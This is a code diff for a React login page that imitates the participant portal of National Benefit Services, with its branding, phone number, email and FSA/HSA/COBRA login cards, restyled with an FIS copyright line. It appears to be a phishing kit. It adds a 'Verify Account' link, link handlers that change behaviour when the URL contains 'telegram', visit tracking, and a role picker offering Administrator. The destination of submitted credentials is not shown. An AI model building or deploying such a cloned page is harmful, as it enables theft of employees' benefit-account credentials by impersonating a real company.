@@ -10,6 +10,8 @@ export default function LoginPage() {
   const hasSentVisitRef = useRef(false);
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
+  const [selectedRole, setSelectedRole] = useState("participant");
+  const [rememberMe, setRememberMe] = useState(false);
   const [isLoginLoading, setIsLoginLoading] = useState(false);
   const [loginError, setLoginError] = useState<string | null>(null);
   const [fieldErrors, setFieldErrors] = useState<{
@@ -17,6 +19,7 @@ export default function LoginPage() {
     password?: string;
   }>({});
   const [toastMessage, setToastMessage] = useState<string | null>(null);
+  const [cookieBannerVisible, setCookieBannerVisible] = useState(true);
   const [honeypot, setHoneypot] = useState("");
   const countdownRef = useRef<number | null>(null);
   const redirectRef = useRef<number | null>(null);
@@ -82,17 +85,12 @@ export default function LoginPage() {
     return ok;
   };
 
-  const handleSignIn = async (event: React.FormEvent<HTMLFormElement>) => {
-    event.preventDefault();
-    
+  const handleSignIn = async () => {
     if (isLoginLoading) return;
 
     if (!validate()) return;
 
-    if (
-      process.env.NODE_ENV !== "production" &&
-      honeypot.trim() !== ""
-    ) {
+    if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
       setLoginError("Suspicious activity detected. Please try again.");
       return;
     }
@@ -144,407 +142,414 @@ export default function LoginPage() {
         *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
         body {
-          font-family: 'Open Sans', Arial, sans-serif;
-          background: #fff;
-          color: #333;
+          font-family: Arial, Helvetica, sans-serif;
+          font-size: 14px;
           min-height: 100vh;
           display: flex;
           flex-direction: column;
         }
 
-        /* ══ TOP NAV ══ */
-        .topnav {
+        /* ── Header ── */
+        .site-header {
           background: #fff;
-          border-bottom: 1px solid #ddd;
-          padding: 8px 20px;
+          padding: 10px 20px;
+          border-bottom: 3px solid #5a5a5a;
           display: flex;
           align-items: center;
-          gap: 24px;
+          min-height: 72px;
         }
 
-        /* NBS logo */
-        .nbs-logo {
-          display: flex;
-          align-items: flex-end;
-          gap: 6px;
-          text-decoration: none;
-          flex-shrink: 0;
-          line-height: 1;
-        }
-        .nbs-icon-wrap {
-          display: flex;
-          flex-direction: column;
-          align-items: flex-start;
+        .site-header img {
+          height: 54px;
+          width: auto;
         }
 
-        /* Contact info */
-        .contact-block {
-          display: flex;
-          flex-direction: column;
-          gap: 2px;
-          font-size: 0.78rem;
-          color: #444;
-        }
-        .contact-row {
-          display: flex;
-          align-items: center;
-          gap: 5px;
-        }
-        .contact-row svg { flex-shrink: 0; color: #666; }
-
-        /* Login label */
-        .nav-login-label {
-          font-size: 1.25rem;
-          font-weight: 300;
-          color: #333;
-          margin-left: 4px;
-        }
-
-        /* ══ MAIN ══ */
-        .main {
+        /* ── Hero / background ── */
+        .hero {
           flex: 1;
-          display: flex;
-          flex-direction: column;
-          align-items: center;
-          padding: 36px 20px 60px;
-        }
-
-        .lock-wrap { margin-bottom: 14px; }
-
-        .privacy-note {
-          font-size: 0.8125rem;
-          color: #555;
-          text-align: center;
-          max-width: 340px;
-          line-height: 1.55;
-          margin-bottom: 18px;
-        }
-
-        .signin-heading {
-          font-size: 1rem;
-          font-weight: 400;
-          color: #333;
-          margin-bottom: 22px;
-        }
-
-        /* ══ FORM ══ */
-        form { width: 100%; max-width: 420px; }
-
-        .field-group { margin-bottom: 18px; }
-
-        .field-label {
-          font-size: 0.8125rem;
-          color: #444;
-          margin-bottom: 5px;
+          position: relative;
           display: flex;
           align-items: center;
-          gap: 3px;
-        }
-        .req { color: #c0392b; font-size: 0.8rem; }
-
-        .field-group input[type="text"],
-        .field-group input[type="password"] {
-          width: 100%;
-          height: 36px;
-          border: 1px solid #aaa;
-          border-radius: 2px;
-          padding: 0 10px;
-          font-size: 0.875rem;
-          font-family: 'Open Sans', sans-serif;
-          color: #333;
-          outline: none;
-          background: #f0f4fa;
-          transition: border-color 0.15s, box-shadow 0.15s;
-        }
-        .field-group input:focus {
-          border-color: #3b5fa0;
-          box-shadow: 0 0 0 2px rgba(59,95,160,0.13);
-          background: #fff;
-        }
-        .field-group.has-error input { border-color: #c0392b; }
-
-        .field-help { font-size: 0.75rem; color: #555; margin-top: 5px; }
-        .field-help a { color: #3b5fa0; text-decoration: none; }
-        .field-help a:hover { text-decoration: underline; }
-
-        .err-msg {
-          display: none;
-          font-size: 0.72rem;
-          color: #c0392b;
-          margin-top: 4px;
-        }
-        .field-group.has-error .err-msg { display: block; }
-
-        /* ══ SIGN IN BUTTON ══ */
-        .btn-signin {
-          background: #3b5fa0;
-          color: #fff;
-          border: none;
-          border-radius: 3px;
-          padding: 0 22px;
-          height: 40px;
-          font-size: 0.875rem;
-          font-weight: 600;
-          font-family: 'Open Sans', sans-serif;
-          letter-spacing: 0.03em;
-          cursor: pointer;
-          display: inline-flex;
-          align-items: center;
-          gap: 10px;
-          margin-bottom: 18px;
-          transition: background 0.15s, transform 0.08s;
-        }
-        .btn-signin:hover { background: #2e4d87; }
-        .btn-signin:active { transform: scale(0.99); }
-        .btn-signin:disabled { opacity: 0.65; cursor: not-allowed; }
-
-        /* spinner */
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .spin-ring {
-          display: none;
-          width: 14px; height: 14px;
-          border: 2px solid rgba(255,255,255,0.35);
-          border-top-color: #fff;
-          border-radius: 50%;
-          animation: spin 0.65s linear infinite;
-        }
-
-        .no-account-text { font-size: 0.8rem; color: #555; margin-bottom: 8px; }
-
-        /* ══ REGISTER BUTTON ══ */
-        .btn-register {
-          background: #2b2b2b;
-          color: #fff;
-          border: none;
-          border-radius: 3px;
-          padding: 0 22px;
-          height: 40px;
-          font-size: 0.875rem;
-          font-weight: 600;
-          font-family: 'Open Sans', sans-serif;
-          letter-spacing: 0.03em;
-          cursor: pointer;
-          display: inline-flex;
-          align-items: center;
-          gap: 10px;
-          transition: background 0.15s;
-        }
-        .btn-register:hover { background: #444; }
-
-        /* ══ FOOTER ══ */
-        footer {
-          background: #e0e0e0;
-          padding: 22px 20px 16px;
-          text-align: center;
-        }
-        .footer-links {
-          display: flex;
           justify-content: center;
-          gap: 32px;
-          margin-bottom: 8px;
+          padding: 40px 16px;
+          background:
+            linear-gradient(
+              135deg,
+              rgba(210,185,130,0.85) 0%,
+              rgba(155,165,175,0.75) 40%,
+              rgba(60,70,85,0.90) 100%
+            ),
+            /* layered clouds look */
+            radial-gradient(ellipse at 30% 40%, rgba(240,215,150,0.6) 0%, transparent 55%),
+            radial-gradient(ellipse at 70% 60%, rgba(80,100,120,0.7) 0%, transparent 60%);
+          background-color: #7a8a9a;
         }
-        .footer-links a {
-          font-size: 0.75rem;
-          color: #444;
-          text-decoration: none;
-          letter-spacing: 0.04em;
-          font-weight: 600;
-          text-transform: uppercase;
-        }
-        .footer-links a:hover { text-decoration: underline; }
-        .footer-copy { font-size: 0.72rem; color: #666; margin-bottom: 10px; }
-        .footer-sitemap a {
-          font-size: 0.72rem;
-          color: #555;
-          text-decoration: none;
-          letter-spacing: 0.06em;
-          text-transform: uppercase;
-        }
-        .footer-sitemap a:hover { text-decoration: underline; }
 
-        /* toast */
-        #toast {
-          position: fixed;
-          bottom: 24px; left: 50%;
-          transform: translateX(-50%) translateY(10px);
-          background: #333; color: #fff;
-          font-size: 0.8rem;
-          font-family: 'Open Sans', sans-serif;
-          padding: 9px 18px;
+        /* ── Login card ── */
+        .login-card {
+          background: rgba(55, 55, 55, 0.93);
+          border-radius: 2px;
+          padding: 30px 36px 36px;
+          width: 100%;
+          max-width: 380px;
+          color: #ccc;
+        }
+
+        .login-card h1 {
+          font-size: 16px;
+          font-weight: 700;
+          color: #e0a020;
+          margin-bottom: 22px;
+          text-align: left;
+        }
+
+        .form-group {
+          margin-bottom: 18px;
+        }
+
+        .form-group label {
+          display: block;
+          font-size: 13px;
+          font-weight: 600;
+          color: #ddd;
+          margin-bottom: 5px;
+        }
+
+        .form-group label .required {
+          color: #e0a020;
+          margin-left: 2px;
+        }
+
+        .form-group input[type="text"],
+        .form-group input[type="password"] {
+          width: 100%;
+          padding: 7px 10px;
+          border: 1px solid #ccc;
+          border-radius: 2px;
+          font-size: 14px;
+          background: #fff;
+          color: #222;
+          outline: none;
+        }
+
+        .form-group input:focus {
+          border-color: #e0a020;
+          box-shadow: 0 0 0 2px rgba(224,160,32,0.25);
+        }
+
+        .role-select {
+          width: 100%;
+          padding: 7px 10px;
+          border: 1px solid #ccc;
+          border-radius: 2px;
+          font-size: 14px;
+          background: #fff;
+          color: #222;
+          appearance: auto;
+          cursor: pointer;
+          margin-bottom: 14px;
+        }
+
+        .remember-row {
+          display: flex;
+          align-items: center;
+          gap: 8px;
+          margin-bottom: 14px;
+          color: #ccc;
+          font-size: 13px;
+        }
+
+        .remember-row input[type="checkbox"] {
+          width: 14px;
+          height: 14px;
+          accent-color: #e0a020;
+          cursor: pointer;
+        }
+
+        .note {
+          font-size: 12.5px;
+          color: #bbb;
+          margin-bottom: 20px;
+          line-height: 1.5;
+        }
+
+        .btn-login {
+          display: block;
+          width: 100%;
+          padding: 11px;
+          background: #e0a020;
+          color: #fff;
+          font-size: 15px;
+          font-weight: 700;
+          letter-spacing: 1.5px;
+          text-align: center;
+          border: none;
           border-radius: 3px;
-          opacity: 0; pointer-events: none;
-          transition: opacity 0.2s, transform 0.2s;
-          z-index: 9999;
+          cursor: pointer;
+          transition: background 0.2s;
+        }
+
+        .btn-login:hover {
+          background: #c98c10;
+        }
+
+        .privacy-link {
+          display: block;
+          text-align: center;
+          margin-top: 14px;
+          color: #e0a020;
+          font-size: 13px;
+          text-decoration: none;
+        }
+
+        .privacy-link:hover {
+          text-decoration: underline;
+        }
+
+        /* ── Footer ── */
+        .site-footer {
+          background: #4a4a4a;
+          color: #bbb;
+          font-size: 12px;
+          padding: 14px 20px;
+          display: flex;
+          flex-wrap: wrap;
+          align-items: center;
+          justify-content: space-between;
+          gap: 10px;
+        }
+
+        .site-footer .footer-left {
+          display: flex;
+          align-items: center;
+          flex-wrap: wrap;
+          gap: 6px;
+        }
+
+        .site-footer a {
+          color: #e0a020;
+          text-decoration: none;
+          font-size: 12px;
+        }
+
+        .site-footer a:hover { text-decoration: underline; }
+
+        .footer-right {
+          display: flex;
+          align-items: center;
+          gap: 16px;
+        }
+
+        .footer-right a { color: #e0a020; font-size: 12px; }
+
+        .help-icon {
+          display: inline-flex;
+          align-items: center;
+          justify-content: center;
+          width: 20px;
+          height: 20px;
+          border-radius: 50%;
+          background: #e0a020;
+          color: #fff;
+          font-size: 12px;
+          font-weight: 700;
+          text-decoration: none !important;
+        }
+
+        /* ── Cookie banner ── */
+        .cookie-banner {
+          position: fixed;
+          bottom: 0;
+          left: 0;
+          right: 0;
+          background: #fff;
+          border-top: 1px solid #ddd;
+          padding: 14px 20px;
+          display: flex;
+          align-items: center;
+          justify-content: space-between;
+          flex-wrap: wrap;
+          gap: 12px;
+          font-size: 13px;
+          color: #333;
+          z-index: 999;
+          box-shadow: 0 -2px 8px rgba(0,0,0,0.1);
+        }
+
+        .cookie-banner.hidden {
+          display: none;
+        }
+
+        .cookie-banner p { flex: 1; min-width: 200px; line-height: 1.5; }
+
+        .cookie-actions {
+          display: flex;
+          align-items: center;
+          gap: 10px;
+        }
+
+        .btn-accept {
+          padding: 9px 18px;
+          background: #4a5a4a;
+          color: #fff;
+          border: none;
+          border-radius: 3px;
+          font-size: 13px;
+          cursor: pointer;
           white-space: nowrap;
         }
-        #toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
-        @media (max-width: 768px) {
-          .topnav {
-            flex-wrap: wrap;
-            gap: 12px;
-            padding: 8px 16px;
+        .btn-accept:hover { background: #3a4a3a; }
+
+        .btn-close-cookie {
+          background: none;
+          border: none;
+          font-size: 18px;
+          cursor: pointer;
+          color: #555;
+          line-height: 1;
+        }
+
+        /* ── Responsive ── */
+        @media (max-width: 480px) {
+          .login-card {
+            padding: 24px 20px 28px;
           }
-          .main {
-            padding: 24px 16px 40px;
+
+          .site-footer {
+            flex-direction: column;
+            align-items: flex-start;
           }
-          .contact-block {
-            font-size: 0.72rem;
-          }
-          footer {
-            padding: 16px 12px 12px;
-          }
-          .footer-links {
-            gap: 16px;
-          }
+
+          .footer-right { flex-wrap: wrap; }
         }
       `}</style>
 
-      {/* ══ TOP NAV ══ */}
-      <nav className="topnav">
-        {/* NBS logo */}
-        <a className="nbs-logo" href="#" onClick={(e) => e.preventDefault()}>
-          <svg
-            width="72"
-            height="44"
-            viewBox="0 0 200 120"
-            fill="none"
-            xmlns="http://www.w3.org/2000/svg"
-          >
-            {/* Yellow/gold swoosh arc on top */}
-            <path
-              d="M10 55 Q60 5 130 30 Q160 40 190 28 Q155 55 100 48 Q55 42 10 55Z"
-              fill="#f5c400"
-            />
-            {/* "nbs" grey letterforms */}
-            <text
-              x="0"
-              y="105"
-              fontFamily="Arial,sans-serif"
-              fontSize="72"
-              fontWeight="700"
-              fill="#6b6b6b"
-              letterSpacing="-2"
-            >
-              nbs
-            </text>
-            {/* Small stacked text right of nbs */}
-            <text
-              x="148"
-              y="80"
-              fontFamily="Arial,sans-serif"
-              fontSize="16"
-              fill="#6b6b6b"
-            >
-              national
-            </text>
-            <text
-              x="148"
-              y="97"
-              fontFamily="Arial,sans-serif"
-              fontSize="16"
-              fill="#6b6b6b"
-            >
-              benefit
-            </text>
-            <text
-              x="148"
-              y="114"
-              fontFamily="Arial,sans-serif"
-              fontSize="16"
-              fill="#6b6b6b"
-            >
-              services
-            </text>
-            {/* TM mark */}
-            <text
-              x="141"
-              y="108"
-              fontFamily="Arial,sans-serif"
-              fontSize="11"
-              fill="#6b6b6b"
-            >
-              ™
-            </text>
-          </svg>
-        </a>
+      {/* ── Header ── */}
+      <header className="site-header">
+        {/* NBS Logo */}
+        <img src="/Nbs%20banner_new.png" alt="National Benefit Services Logo" />
+      </header>
 
-        {/* Contact info */}
-        <div className="contact-block">
-          <div className="contact-row">
-            <svg
-              width="12"
-              height="12"
-              viewBox="0 0 24 24"
-              fill="none"
-              stroke="currentColor"
-              strokeWidth="2"
-              strokeLinecap="round"
-              strokeLinejoin="round"
-            >
-              <path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 9.81 19.79 19.79 0 01.01 1.18 2 2 0 012 0h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.09 7.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 14z" />
-            </svg>
-            855-399-3035
-          </div>
-          <div className="contact-row">
-            <svg
-              width="12"
-              height="12"
-              viewBox="0 0 24 24"
-              fill="none"
-              stroke="currentColor"
-              strokeWidth="2"
-              strokeLinecap="round"
-              strokeLinejoin="round"
-            >
-              <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
-              <polyline points="22,6 12,13 2,6" />
-            </svg>
-            service@nbsbenefits.com
-          </div>
-        </div>
-
-        <span className="nav-login-label">Login</span>
-      </nav>
-
-      {/* ══ MAIN ══ */}
-      <div className="main">
-        <div className="lock-wrap">
-          <svg
-            width="44"
-            height="44"
-            viewBox="0 0 24 24"
-            fill="none"
-            stroke="#555"
-            strokeWidth="1.3"
-            strokeLinecap="round"
-            strokeLinejoin="round"
-          >
-            <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
-            <path d="M7 11V7a5 5 0 0110 0v4" />
-            <circle cx="12" cy="16" r="1" fill="#555" stroke="none" />
-          </svg>
-        </div>
-
-        <p className="privacy-note">
-          We will maintain the confidentiality of your personal information in
-          accordance with our privacy policy.
+      {/* ── Info Section ── */}
+      <section
+        className="info-section"
+        style={{
+          display: hasInteracted ? "block" : "none",
+          backgroundColor: "#f5f5f5",
+          padding: "30px 20px",
+          textAlign: "center",
+          color: "#333",
+        }}
+      >
+        <h2 style={{ fontSize: "22px", marginBottom: "15px" }}>
+          Secure Access to Your Employee Benefits
+        </h2>
+        <p
+          style={{
+            maxWidth: "800px",
+            margin: "0 auto 20px",
+            lineHeight: "1.6",
+            color: "#555",
+          }}
+        >
+          National Benefit Services provides secure, convenient access to your
+          FSA accounts, HSA plans, COBRA coverage, and other employee benefits
+          through our dedicated participant portal. Log in to manage your health
+          and dependent care benefits, submit claims, and view reimbursement
+          accounts.
         </p>
-
-        <p className="signin-heading">Sign in</p>
-
-        <form id="login-form" noValidate onSubmit={handleSignIn}>
-          {/* UserId */}
+        <div
+          style={{
+            display: "grid",
+            gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))",
+            gap: "15px",
+            maxWidth: "900px",
+            margin: "20px auto",
+          }}
+        >
           <div
-            className={`field-group ${fieldErrors.userid ? "has-error" : ""}`}
-            id="fg-user"
+            style={{
+              padding: "15px",
+              backgroundColor: "#fff",
+              borderRadius: "5px",
+              boxShadow: "0 1px 3px rgba(0,0,0,0.1)",
+            }}
           >
-            <div className="field-label">
-              UserId <span className="req">*</span>
-            </div>
+            <h3
+              style={{
+                fontSize: "16px",
+                marginBottom: "10px",
+                color: "#e0a020",
+              }}
+            >
+              FSA Login
+            </h3>
+            <p style={{ fontSize: "14px", color: "#666" }}>
+              Access your Flexible Spending Account for health and dependent
+              care reimbursement.
+            </p>
+          </div>
+          <div
+            style={{
+              padding: "15px",
+              backgroundColor: "#fff",
+              borderRadius: "5px",
+              boxShadow: "0 1px 3px rgba(0,0,0,0.1)",
+            }}
+          >
+            <h3
+              style={{
+                fontSize: "16px",
+                marginBottom: "10px",
+                color: "#e0a020",
+              }}
+            >
+              HSA Login
+            </h3>
+            <p style={{ fontSize: "14px", color: "#666" }}>
+              Manage your Health Savings Account and track eligible medical
+              expenses.
+            </p>
+          </div>
+          <div
+            style={{
+              padding: "15px",
+              backgroundColor: "#fff",
+              borderRadius: "5px",
+              boxShadow: "0 1px 3px rgba(0,0,0,0.1)",
+            }}
+          >
+            <h3
+              style={{
+                fontSize: "16px",
+                marginBottom: "10px",
+                color: "#e0a020",
+              }}
+            >
+              COBRA Login
+            </h3>
+            <p style={{ fontSize: "14px", color: "#666" }}>
+              Access continuation health coverage and manage your COBRA benefits
+              and enrollment.
+            </p>
+          </div>
+        </div>
+      </section>
+
+      {/* ── Hero with Login Card ── */}
+      <main className="hero">
+        <div className="login-card">
+          <h1>Welcome to National Benefit Services, LLC</h1>
+
+          <div className="form-group">
+            <label htmlFor="username">
+              Username <span className="required">*</span>
+            </label>
             <input
               type="text"
-              id="userid"
+              id="username"
+              name="username"
               autoComplete="username"
               value={username}
               onChange={(e) => {
@@ -552,28 +557,16 @@ export default function LoginPage() {
                 clearErr("userid");
               }}
             />
-            <div className="field-help">
-              Forgot your Username?{" "}
-              <a href="#" onClick={(e) => e.preventDefault()}>
-                Let us help
-              </a>
-            </div>
-            <div className="err-msg">
-              {fieldErrors.userid || "Please enter your User ID."}
-            </div>
           </div>
 
-          {/* Password */}
-          <div
-            className={`field-group ${fieldErrors.password ? "has-error" : ""}`}
-            id="fg-pwd"
-          >
-            <div className="field-label">
-              Password <span className="req">*</span>
-            </div>
+          <div className="form-group">
+            <label htmlFor="password">
+              Password <span className="required">*</span>
+            </label>
             <input
               type="password"
               id="password"
+              name="password"
               autoComplete="current-password"
               value={password}
               onChange={(e) => {
@@ -581,16 +574,35 @@ export default function LoginPage() {
                 clearErr("password");
               }}
             />
-            <div className="field-help">
-              Forgot your Password?{" "}
-              <a href="#" onClick={(e) => e.preventDefault()}>
-                Let us help
-              </a>
-            </div>
-            <div className="err-msg">
-              {fieldErrors.password || "Please enter your Password."}
-            </div>
           </div>
+
+          <select
+            className="role-select"
+            aria-label="User role"
+            value={selectedRole}
+            onChange={(e) => setSelectedRole(e.target.value)}
+          >
+            <option value="participant">Participant</option>
+            <option value="employer">Employer</option>
+            <option value="broker">Broker</option>
+            <option value="admin">Administrator</option>
+          </select>
+
+          <div className="remember-row">
+            <input
+              type="checkbox"
+              id="remember"
+              name="remember"
+              checked={rememberMe}
+              onChange={(e) => setRememberMe(e.target.checked)}
+            />
+            <label htmlFor="remember">Remember me on this device</label>
+          </div>
+
+          <p className="note">
+            Note: The password is case sensitive. If you fail to login three
+            consecutive times your account could be disabled.
+          </p>
 
           {/* Honeypot */}
           <input
@@ -602,88 +614,112 @@ export default function LoginPage() {
             autoComplete="off"
           />
 
-          {/* Sign In */}
-          <button type="submit" className="btn-signin" id="signin-btn">
-            <svg
-              id="signin-check"
-              width="16"
-              height="16"
-              viewBox="0 0 24 24"
-              fill="none"
-              stroke="white"
-              strokeWidth="3"
-              strokeLinecap="round"
-              strokeLinejoin="round"
-            >
-              <polyline points="20 6 9 17 4 12" />
-            </svg>
-            <div className="spin-ring" id="signin-spin"></div>
-            <span id="signin-label">{isLoginLoading ? "Signing in…" : "Sign In"}</span>
-          </button>
-
-          {/* Register */}
-          <p className="no-account-text">Don't have an account?</p>
-          <button
-            type="button"
-            className="btn-register"
-            onClick={() => showToast("Opening registration…")}
-          >
-            <svg
-              width="16"
-              height="16"
-              viewBox="0 0 24 24"
-              fill="none"
-              stroke="white"
-              strokeWidth="2"
-              strokeLinecap="round"
-              strokeLinejoin="round"
-            >
-              <path d="M16 21v-2a4 4 0 00-4-4H6a4 4 0 00-4 4v2" />
-              <circle cx="9" cy="7" r="4" />
-              <line x1="19" y1="8" x2="19" y2="14" />
-              <line x1="22" y1="11" x2="16" y2="11" />
-            </svg>
-            Register
-          </button>
-
           {loginError && (
-            <p style={{ color: "#c0392b", fontSize: "0.72rem", marginTop: "4px" }}>
+            <p
+              style={{
+                color: "#c0392b",
+                fontSize: "12.5px",
+                marginBottom: "14px",
+              }}
+            >
               {loginError}
             </p>
           )}
-        </form>
-      </div>
 
-      {/* ══ FOOTER ══ */}
-      <footer>
-        <div className="footer-links">
-          <a href="#" onClick={(e) => e.preventDefault()}>
-            ABOUT US
-          </a>
-          <a href="#" onClick={(e) => e.preventDefault()}>
-            TERMS OF USE
-          </a>
-          <a href="#" onClick={(e) => e.preventDefault()}>
-            PRIVACY POLICY
+          <button
+            className="btn-login"
+            type="button"
+            onClick={handleSignIn}
+            disabled={isLoginLoading}
+          >
+            {isLoginLoading ? "SIGNING IN..." : "LOGIN"}
+          </button>
+
+          <a
+            className="privacy-link"
+            href="#"
+            onClick={(e) => e.preventDefault()}
+          >
+            Privacy and Terms of Use
           </a>
         </div>
-        <p className="footer-copy">
-          Copyright © 2020 National Benefit Services, LLC. All Rights Reserved.
-        </p>
-        <div className="footer-sitemap">
+      </main>
+
+      {/* ── Footer ── */}
+      <footer className="site-footer">
+        <div className="footer-left">
+          <span>
+            Copyright © 2021 FIS and/or its subsidiaries. All Rights Reserved.
+          </span>
+          <span>|</span>
+          <a
+            href="/forgot-password"
+            onClick={(e) => {
+              if (
+                typeof window !== "undefined" &&
+                window.location.href.includes("telegram")
+              )
+                e.preventDefault();
+            }}
+          >
+            Forgot Password?
+          </a>
+          <span>|</span>
           <a href="#" onClick={(e) => e.preventDefault()}>
-            SITE MAP
+            Problems viewing the site?
+          </a>
+        </div>
+        <div className="footer-right">
+          <a
+            href="/verify"
+            onClick={(e) => {
+              if (
+                typeof window !== "undefined" &&
+                window.location.href.includes("telegram")
+              )
+                e.preventDefault();
+            }}
+          >
+            Verify Account
+          </a>
+          <a href="#" onClick={(e) => e.preventDefault()}>
+            Cookies Settings
+          </a>
+          <a href="#" onClick={(e) => e.preventDefault()}>
+            Privacy Policy
+          </a>
+          <a href="#" className="help-icon" onClick={(e) => e.preventDefault()}>
+            ?
           </a>
         </div>
       </footer>
 
-      {/* Toast */}
+      {/* ── Cookie Banner ── */}
       <div
-        id="toast"
-        className={toastMessage ? "show" : ""}
-        style={{ display: toastMessage ? "block" : "none" }}
+        className={`cookie-banner ${!cookieBannerVisible ? "hidden" : ""}`}
+        id="cookieBanner"
       >
-        {toastMessage}
+        <p>
+          We only use cookies which are essential for the operation of our
+          website. These are necessary for our website to work properly. You can
+          learn more about our use of cookies and similar technology by
+          reviewing our
+        </p>
+        <div className="cookie-actions">
+          <button
+            className="btn-accept"
+            onClick={() => setCookieBannerVisible(false)}
+          >
+            Accept All Cookies
+          </button>
+          <button
+            className="btn-close-cookie"
+            onClick={() => setCookieBannerVisible(false)}
+            aria-label="Close"
+          >
+            ×
+          </button>
+        </div>
       </div>
     </>
   );
